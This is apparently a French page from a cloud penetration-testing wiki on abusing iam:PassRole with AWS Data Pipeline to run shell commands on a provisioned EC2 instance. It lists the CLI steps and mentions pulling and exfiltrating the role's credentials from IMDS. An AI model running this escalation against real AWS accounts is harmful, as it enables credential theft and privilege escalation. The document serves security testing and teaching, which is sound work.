---
title: "Data Pipeline : PassRole pour l'exécution de shell sur des ressources provisionnées"
description: "iam:PassRole vers AWS Data Pipeline pour exécuter des commandes shell arbitraires sur des ressources provisionnées sous un rôle de ressource privilégié."
keywords:
  - PassRole
  - Data Pipeline
  - rôle de ressource
  - exécution de commandes
  - EC2
---

# Data Pipeline

AWS Data Pipeline provisionne du calcul (une ressource EC2) pour exécuter les activités du pipeline sous un **rôle de ressource**. Avec `iam:PassRole` et `datapipeline:CreatePipeline` plus `PutPipelineDefinition`, vous définissez une `ShellCommandActivity` qui exécute vos commandes sur cette ressource, laquelle porte les identifiants du rôle passé via son profil d'instance.

## Définir une activité shell

```bash
aws datapipeline create-pipeline --name x --unique-id x
aws datapipeline put-pipeline-definition --pipeline-id <id> \
  --pipeline-objects file://objects.json \
  --parameter-values myRole=<privileged-resource-role>
aws datapipeline activate-pipeline --pipeline-id <id>
```

La `ShellCommandActivity` dans `objects.json` s'exécute sur la ressource EC2 provisionnée, de sorte qu'elle peut interroger IMDS pour les identifiants du rôle de ressource et les exfiltrer.

## Notes d'exploitation

- Data Pipeline est un service hérité mais reste une escalade connue lorsque le rôle de ressource est privilégié.
- L'activité s'exécute sur une véritable instance, de sorte que la récupération via [EC2 IMDS](../../../credentials/instance-metadata/index.md) s'applique une fois la commande arrivée.

## Outils

- **AWS CLI** (`datapipeline create-pipeline` / `put-pipeline-definition`).
- **Pacu** : module privesc Data Pipeline.

## Références

- [Rhino Security Labs: AWS privilege escalation (Data Pipeline)](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [BishopFox: iam-vulnerable](https://github.com/BishopFox/iam-vulnerable)
- [Pacu (Rhino Security Labs)](https://github.com/RhinoSecurityLabs/pacu)
- [Hacking the Cloud: AWS](https://hackingthe.cloud/)
